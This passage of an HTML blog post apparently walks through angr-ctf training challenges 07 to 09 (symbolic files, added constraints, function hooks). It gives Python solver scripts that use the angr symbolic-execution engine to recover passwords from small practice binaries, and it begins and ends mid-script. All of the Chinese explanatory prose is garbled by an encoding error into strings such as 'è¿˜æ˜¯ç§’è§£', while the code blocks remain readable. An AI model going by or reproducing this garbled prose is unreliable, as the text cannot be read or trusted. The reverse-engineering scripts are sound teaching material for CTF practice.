&#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ç§’è§£ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/6Oyk2cTxbDjpYVE.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="07-angr-symbolic-fileï¼šç¬¦å·åŒ–æ–‡ä»¶"><a href="#07-angr-symbolic-fileï¼šç¬¦å·åŒ–æ–‡ä»¶" class="headerlink" title="07_angr_symbolic_fileï¼šç¬¦å·åŒ–æ–‡ä»¶"></a>07_angr_symbolic_fileï¼šç¬¦å·åŒ–æ–‡ä»¶</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDA ä¸­ï¼Œå‘ç°å…¶ä¼šå…ˆè¯»å…¥ 64 å­—èŠ‚ï¼Œä¹‹åé€šè¿‡ <code>ignoreme()</code> å°†å…¶å†™å…¥ä¸€ä¸ªç‰¹å®šæ–‡ä»¶ä¸­ï¼Œå†ä»è¯¥æ–‡ä»¶ä¸­æŠŠè¾“å…¥è¯»å›æ¥ï¼Œä¹‹åå°±åˆæ˜¯å¸¸è§„çš„ complex æ“ä½œä¸€ç•ªåä¸ä¸€ä¸ªç‰¹å®šå­—ç¬¦ä¸²è¿›è¡Œæ¯”å¯¹</p>
<p><img src="https://s2.loli.net/2022/10/31/snWIloVkGtUxcdz.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¯”è¾ƒå®¹æ˜“æƒ³åˆ°çš„æ–¹æ³•å°±æ˜¯<strong>ç›´æ¥ä»æ–‡ä»¶è¯»å…¥ç»“æŸåå¼€å§‹ä½œä¸ºåˆå§‹çŠ¶æ€</strong>ï¼Œä¹‹åç”¨ 05 çš„ç¬¦å·åŒ–å†…å­˜çš„æ–¹æ³•æ¥æ±‚è§£ï¼Œä¸è¿‡è¿™æ ·å°±ä¸æ˜¯è¿™é“é¢˜å‡ºé¢˜çš„ç›®çš„äº†ï¼šï¼‰</p>
<h3 id="Emulated-Filesystem-angr-çš„æ–‡ä»¶ç³»ç»Ÿ"><a href="#Emulated-Filesystem-angr-çš„æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="Emulated Filesystem - angr çš„æ–‡ä»¶ç³»ç»Ÿ"></a>Emulated Filesystem - angr çš„æ–‡ä»¶ç³»ç»Ÿ</h3><p>åœ¨ angr å½“ä¸­ä¸æ–‡ä»¶ç³»ç»Ÿé—´çš„æ“ä½œæ˜¯é€šè¿‡ <code>SimFile</code> å¯¹è±¡å®Œæˆçš„ï¼ŒSimFile ä¸ºå¯¹  <em>å­˜å‚¨</em>  çš„æŠ½è±¡æ¨¡å‹ï¼Œä¸€ä¸ª SimFile å¯¹è±¡å¯ä»¥è¡¨ç¤ºä¸€ç³»åˆ—çš„å­—èŠ‚ã€ç¬¦å·ç­‰</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>angr.SimFile()</code> æ¥åˆ›å»ºä¸€ä¸ªæ¨¡æ‹Ÿæ–‡ä»¶ï¼Œåˆ›å»ºå¸¦æœ‰å…·ä½“å€¼ä¸ç¬¦å·å˜é‡çš„ SimFile ğŸŒ°å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr, claripy<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file = angr.SimFile(<span class="hljs-string">&#x27;a_file&#x27;</span>, content = <span class="hljs-string">&quot;flag&#123;F4k3_f1@9!&#125;\n&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file2 = angr.SimFile(<span class="hljs-string">&#x27;another_file&#x27;</span>, bvs, size=<span class="hljs-number">8</span>) <span class="hljs-comment"># size in bytes there</span><br></code></pre></td></tr></table></figure>

<p>æ¨¡æ‹Ÿæ–‡ä»¶éœ€è¦ä¸ç‰¹å®šçš„çŠ¶æ€è¿›è¡Œå…³è”ï¼Œé€šè¿‡ <code>state.fs.insert(sim_file)</code>  æˆ‘ä»¬å¯ä»¥å°† SimFile æ’å…¥åˆ°ä¸€ä¸ªçŠ¶æ€çš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.fs.insert(<span class="hljs-string">&#x27;test_file&#x27;</span>, sim_file)<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è¿˜å¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–å†…å®¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>pos = <span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>data, actural_read, pos = sim_file.read(pos, <span class="hljs-number">0x100</span>)<br></code></pre></td></tr></table></figure>

<p>å¯¹äº  <em>æµ</em>  ï¼ˆStreamsï¼Œä¾‹å¦‚æ ‡å‡†IOã€TCPè¿æ¥ç­‰ï¼‰ç±»å‹çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ <code>angr.SimPackets()</code> æ¥åˆ›å»ºï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet = angr.SimPackets(<span class="hljs-string">&#x27;my_packet&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet<br>&lt;angr.storage.file.SimPackets <span class="hljs-built_in">object</span> at <span class="hljs-number">0x7f75626a2e80</span>&gt;<br></code></pre></td></tr></table></figure>



<h3 id="FINAL-EXPLOIT-3"><a href="#FINAL-EXPLOIT-3" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>é‚£ä¹ˆæœ¬é¢˜å®é™…ä¸Šæ˜¯è®©æˆ‘ä»¬åˆ©ç”¨ angr æ¥åˆ›å»ºä¸€ä¸ª<strong>æ¨¡æ‹Ÿæ–‡ä»¶</strong>ä»¥æ¨¡æ‹Ÿè¯»å–æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œè¿™é‡Œæˆ‘ä»¬å°†åˆå§‹çŠ¶æ€è®¾ä¸ºä»æ‰“å¼€æ–‡ä»¶å¼€å§‹ï¼Œä¹‹ååˆ›å»ºä¸€ä¸ªä½å‘é‡ç¬¦å·æ”¾å…¥æ¨¡æ‹Ÿæ–‡ä»¶å¹¶å°†æ¨¡æ‹Ÿæ–‡ä»¶æ’å…¥æ–‡ä»¶ç³»ç»Ÿï¼Œä¹‹åæ¢ç´¢åˆ°å¯¹åº”çŠ¶æ€åæ±‚è§£å³å¯ï¼Œè§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Good Job.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Try again.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./07_angr_symbolic_file&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_address = <span class="hljs-number">0x8049550</span> <span class="hljs-comment"># first insn returned from ignoreme()</span><br>    init_state = proj.factory.blank_state(addr = start_address)<br><br>    <span class="hljs-comment"># create BVS and SimFile</span><br>    file_size = <span class="hljs-number">0x40</span><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, file_size * <span class="hljs-number">8</span>) <span class="hljs-comment"># 0x40 bytes</span><br>    file_name = <span class="hljs-string">&#x27;KBECVEJF.txt&#x27;</span><br>    sim_file = angr.storage.SimFile(file_name, password, size = file_size)<br><br>    <span class="hljs-comment"># load the SimFile</span><br>    init_state.fs.insert(file_name, sim_file)<br><br>    <span class="hljs-comment"># solve it</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution = solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Could not find the solution&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ç§’è§£ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/lTfoUMzQANGSbnH.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x03-angr-ctfï¼šçº¦æŸæ¡ä»¶"><a href="#0x03-angr-ctfï¼šçº¦æŸæ¡ä»¶" class="headerlink" title="0x03. angr-ctfï¼šçº¦æŸæ¡ä»¶"></a>0x03. angr-ctfï¼šçº¦æŸæ¡ä»¶</h1><h2 id="08-angr-constraintsï¼šæ·»åŠ çº¦æŸ"><a href="#08-angr-constraintsï¼šæ·»åŠ çº¦æŸ" class="headerlink" title="08_angr_constraintsï¼šæ·»åŠ çº¦æŸ"></a>08_angr_constraintsï¼šæ·»åŠ çº¦æŸ</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œè¿˜æ˜¯è¯»å…¥è¾“å…¥å complex å‡½æ•°å¤„ç†åè¿›è¡Œæ¯”å¯¹çš„æ¨¡å¼ï¼Œè¿™é‡Œçš„ <code>0x804C040</code> å°±æ˜¯ <code>buffer</code> çš„åœ°å€ï¼Œä¸è¿‡å…¶è‡ªå®šä¹‰äº†ä¸€ä¸ªå¯¹æ¯”å‡½æ•°ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/4DXMH3GIQdiZOwC.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è‡ªå®šä¹‰çš„å¯¹æ¯”å‡½æ•°æ¯”è¾ƒå¸¸è§„ï¼Œå…¶ä¸­çš„ <code>0x804C030</code> ä¾¿æ˜¯ <code>password</code> çš„åœ°å€ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/sxXtqvHYyiN5COg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨ <code>check_equals_xx()</code> å‡½æ•°å½“ä¸­ç”±äºå…¶é€‰æ‹©äº†é€å­—ç¬¦æ¯”è¾ƒåå¢åŠ è®¡æ•°çš„æ¯”è¾ƒæ–¹å¼çš„ç¼˜æ•…ï¼Œä¼šå¯¼è‡´ <strong>è·¯å¾„çˆ†ç‚¸</strong>ï¼ˆpath explosionï¼‰çš„é—®é¢˜</p>
<h3 id="angr-ä¸­çš„çº¦æŸ"><a href="#angr-ä¸­çš„çº¦æŸ" class="headerlink" title="angr ä¸­çš„çº¦æŸ"></a>angr ä¸­çš„çº¦æŸ</h3><p>å‰é¢æˆ‘ä»¬è®²åˆ°ä½å‘é‡ä¹‹é—´å¯ä»¥è¿›è¡Œè¿ç®—ï¼Œç±»ä¼¼åœ°ï¼Œä½å‘é‡ä¹‹é—´ä¹Ÿå¯ä»¥è¿›è¡Œ<strong>æ¯”è¾ƒè¿ç®—</strong> ï¼Œå…¶ç»“æœä¸º <code>Bool</code> ç±»å‹çš„å¯¹è±¡ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv == bvv2<br>&lt;Bool <span class="hljs-literal">True</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs == bvv + bvv2<br>&lt;Bool bvs_0_32 == <span class="hljs-number">0xbd5b7dde</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&#x27;bvs2&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 &gt; bvs * bvv + bvv2<br>&lt;Bool bvs2_1_32 &gt; bvs_0_32 * <span class="hljs-number">0xdeadbeef</span> + <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure>

<p>å¯¹äºå¸¦æœ‰ç¬¦å·å€¼çš„æ¯”è¾ƒè€Œè¨€ï¼Œ <code>Bool</code> ç±»å‹çš„å¯¹è±¡ç›´æ¥è¡¨ç¤ºäº†å¯¹åº”çš„å¼å­ï¼Œå› æ­¤å¯ä»¥ä½œä¸º<strong>çº¦æŸæ¡ä»¶</strong>è¢«æ·»åŠ åˆ°ä¸€ä¸ªçŠ¶æ€å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>state.solver.add()</code> ä¸ºå¯¹åº”çŠ¶æ€æ·»åŠ çº¦æŸï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs == bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs2 &gt; bvs * bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.<span class="hljs-built_in">eval</span>(bvs2) <span class="hljs-comment"># get the concrete value under constraints</span><br></code></pre></td></tr></table></figure>

<p>é™¤äº† Bool ç±»ä»¥å¤–ï¼ŒClaripy è¿˜æä¾›äº†ä¸€äº›ä»¥ä½å‘é‡ä½œä¸ºç»“æœçš„è¿ç®—æ“ä½œï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªğŸŒ°ï¼ˆå®Œæ•´çš„è¿˜æ˜¯å»è¯»<a target="_blank" rel="noopener" href="https://docs.angr.io/advanced-topics/claripy">æ–‡æ¡£</a>å§ï¼‰ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>claripy.If(bvs == bvs2, bvs, bvs2)<br>&lt;BV32 <span class="hljs-keyword">if</span> bvs_0_32 == bvs2_1_32 then bvs_0_32 <span class="hljs-keyword">else</span> bvs2_1_32&gt;<br></code></pre></td></tr></table></figure>



<h3 id="FINAL-EXPLOIT-4"><a href="#FINAL-EXPLOIT-4" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>ç”±äºå¾…æ¯”è¾ƒå­—ç¬¦ä¸²æ˜¯å›ºå®šçš„ï¼Œæ•…æˆ‘ä»¬å¯ä»¥è®© <code>explore()</code> åœ¨å®Œæˆå¯¹è¾“å…¥çš„å˜æ¢åã€åœ¨è¿›å…¥æ¯”è¾ƒå‡½æ•°ä¹‹å‰åœä¸‹ï¼Œä¹‹åç›´æ¥ä¸ºè¯¥çŠ¶æ€æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªå¯¹åº”çš„çº¦æŸåè¿›è¡Œæ±‚è§£å³å¯</p>
<p>è¿™é‡Œæ·»åŠ çº¦æŸçš„æ–¹æ³•æ˜¯ä½¿ç”¨ <code>state.memory.load(addr, size_in_bytes)</code> æˆå‘˜å‡½æ•°å°†å½“å‰çŠ¶æ€çš„æŸä¸ªå†…å­˜åŒºåŸŸä½œä¸ºä¸€ä¸ª BVS æå–å‡ºæ¥ï¼Œä¹‹åé€šè¿‡ <code>state.add_constraints(condition)</code> æ·»åŠ çº¦æŸæŒ‡å®šè¯¥å—å†…å­˜åœ¨å½“å‰çŠ¶æ€ä¸‹çš„å€¼ä¸ºç‰¹å®šå­—ç¬¦ä¸²ï¼Œæœ€åä½¿ç”¨ <code>state.solver.eval()</code> æ±‚è§£åŸæ¥çš„ buffer å³å¯</p>
<p>æœ€ç»ˆçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼Œè¯¦è§æ³¨é‡Šï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./08_angr_constraints&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_addr = <span class="hljs-number">0x804935D</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    <span class="hljs-comment"># BVS for buffer</span><br>    buffer_addr = <span class="hljs-number">0x804C040</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># explore to check_equals()</span><br>    check_addr = <span class="hljs-number">0x80493A9</span> <span class="hljs-comment"># last insn before call check_equals() </span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = check_addr)<br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-comment"># get the buffer BVS of check_state</span><br>    password = check_state.memory.load(buffer_addr, buffer_size)<br>    compared_str = <span class="hljs-string">&quot;EFJLFOGMURLEVNXN&quot;</span><br><br>    <span class="hljs-comment"># add and solve the constraints</span><br>    check_state.add_constraints(password == compared_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ç§’è§£ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/01/Lh5YzU3RPyD2ZTW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x04-angr-ctfï¼šå‡½æ•°æ“ä½œ"><a href="#0x04-angr-ctfï¼šå‡½æ•°æ“ä½œ" class="headerlink" title="0x04. angr-ctfï¼šå‡½æ•°æ“ä½œ"></a>0x04. angr-ctfï¼šå‡½æ•°æ“ä½œ</h1><h2 id="09-angr-hooksï¼šå‡½æ•°æ›¿æ¢"><a href="#09-angr-hooksï¼šå‡½æ•°æ›¿æ¢" class="headerlink" title="09_angr_hooksï¼šå‡½æ•°æ›¿æ¢"></a>09_angr_hooksï¼šå‡½æ•°æ›¿æ¢</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œç¨‹åºå¤§æ¦‚çš„ä¸»ä½“é€»è¾‘æ˜¯è¯»å…¥ buffer åç»è¿‡ <code>complex_function()</code> è¿ç®—ï¼Œä¹‹åé€šè¿‡ <code>check_equals()</code> ä¸ password è¿›è¡Œå¯¹æ¯”å¹¶æŠŠç»“æœå­˜åˆ° <code>equals</code> å˜é‡å½“ä¸­ï¼›ä¹‹åå°† password ç»è¿‡ <code>complex_function()</code> è¿ç®—ï¼Œéšåå†è¯»å…¥ buffer ä¸ password è¿›è¡Œå¯¹æ¯”ï¼›ä¸¤ä¸ªæ¡ä»¶éƒ½ç¬¦åˆäº†æ‰ä¼šè¾“å‡º <code>&quot;Good Job.&quot;</code> </p>
<p>å…¶ä¸­ <code>0x804C044</code> å°±æ˜¯ buffer çš„åœ°å€ï¼Œ<code>0x804C034</code> å°±æ˜¯ password çš„åœ°å€</p>
<p><img src="https://s2.loli.net/2022/11/02/sIjxptNAr7ZCeuo.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å…¶ä¸­ <code>check_equals()</code> é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå°±ç®—ç®€å•çš„ä¸ password è¿›è¡Œå¯¹æ¯”ï¼Œä¸è¿‡ç”±äºæ˜¯<strong>é€å­—ç¬¦å¯¹æ¯”</strong>åå¢åŠ ç»Ÿè®¡æ•°é‡ï¼Œå› æ­¤ä¼šå¯¼è‡´<strong>è·¯å¾„çˆ†ç‚¸</strong>ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/02/5NAMaSsoHVZ4geL.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å¦‚æœæ˜¯åƒ 02 é‚£æ ·ç›´æ¥æ±‚è§£ï¼Œ<code>check_equals()</code> å¸¦æ¥çš„è·¯å¾„çˆ†ç‚¸ä¼šéå¸¸ä»¤äººå¤´å¤§ï¼Œè€Œè¯¥å‡½æ•°çš„åŠŸèƒ½æœ¬è´¨ä¸Šå°±ä»…æ˜¯ä¸ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥<strong>ä½¿ç”¨ angr æ¥ hook æ‰è¯¥å‡½æ•°ï¼Œè‡ªè¡Œå®ç°ç­‰ä»·çš„æ“ä½œå‡½æ•°</strong></p>
<h3 id="project-hook-å‡½æ•°é’©å­"><a href="#project-hook-å‡½æ•°é’©å­" class="headerlink" title="project.hook() - å‡½æ•°é’©å­"></a>project.hook() - å‡½æ•°é’©å­</h3><p>æœ‰çš„æ—¶å€™æˆ‘ä»¬ä¼šæœ‰éœ€è¦ hook æ‰æŸä¸ªå‡½æ•°çš„éœ€æ±‚ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>project.hook(addr = call_insn_addr, hook = my_function, length = n)</code> æ¥ hook æ‰å¯¹åº”çš„ call æŒ‡ä»¤ï¼Œå…¶ä¸­ <code>call_insn_addr</code> ä¸º call æŒ‡ä»¤çš„åœ°å€ï¼Œ<code>my_function</code> ä¸ºæˆ‘ä»¬çš„è‡ªå®šä¹‰å‡½æ•°ï¼Œ <code>length</code> ä¸º call æŒ‡ä»¤çš„é•¿åº¦ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/02/Y5ptBU8oAsTdj7c.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æˆ‘ä»¬çš„è‡ªå®šä¹‰å‡½æ•°åº”å½“ä¸ºæ¥æ”¶ <code>state</code> ä½œä¸ºå‚æ•°çš„å‡½æ•°ï¼Œangr è¿˜æä¾›äº† decorator è¯­æ³•ç³–ï¼Œå› æ­¤ä»¥ä¸‹ä¸¤ç§å†™æ³•éƒ½å¯ä»¥ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># method 1</span><br><span class="hljs-meta">@project.hook(<span class="hljs-params"><span class="hljs-number">0x1234</span>, length=<span class="hljs-number">5</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br><br><span class="hljs-comment"># method 2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func2</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br>proj.hook(addr = <span class="hljs-number">0x5678</span>, hook = my_hook_func2, length = <span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>

<h3 id="FINAL-EXPLOIT-5"><a href="#FINAL-EXPLOIT-5" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>å› æ­¤æœ¬é¢˜æˆ‘ä»¬åªéœ€è¦ hook æ‰æ¯”è¾ƒå‡½æ•°ä¾¿èƒ½è§£å†³è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>claripy.If()</code> åˆ›å»ºä¸€ä¸ªæ¯”è¾ƒå¹¶å°†å€¼ç»™åˆ° eax å¯„å­˜å™¨ä½œä¸ºè¿”å›å€¼ï¼Œæœ€åå°±æ˜¯å¸¸è§„çš„å†…å­˜ç¬¦å·åŒ–åæ±‚è§£å³å¯ï¼Œæœ€ç»ˆçš„æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    start_addr 